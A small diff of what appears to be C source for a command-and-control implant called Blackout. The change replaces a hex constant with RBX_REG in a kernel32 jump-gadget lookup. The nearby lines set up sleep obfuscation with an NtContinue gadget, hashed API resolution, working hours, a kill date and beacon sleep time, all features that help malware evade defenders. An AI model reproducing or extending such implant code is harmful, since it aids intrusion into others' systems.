@@ -226,7 +226,7 @@ FUNC VOID BlackoutInit(
     Blackout().bkApi                     = _BK_API_;
     Blackout().SleepObf.Technique        = _BK_SLEEP_OBF_; 
     Blackout().SleepObf.NtContinueGadget = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "LdrInitializeThunk" ) ) + 19;
-    Blackout().SleepObf.JmpGadget        = FindJmpGadget( Instance()->Modules.Kernel32, 0x23 );
+    Blackout().SleepObf.JmpGadget        = FindJmpGadget( Instance()->Modules.Kernel32, RBX_REG );
     Instance()->Session.WorkingHours     = CONFIG_WRKHRS;
     Instance()->Session.KillDate         = CONFIG_KILLDATE;
     Instance()->Session.SleepTime        = CONFIG_SLEEP;
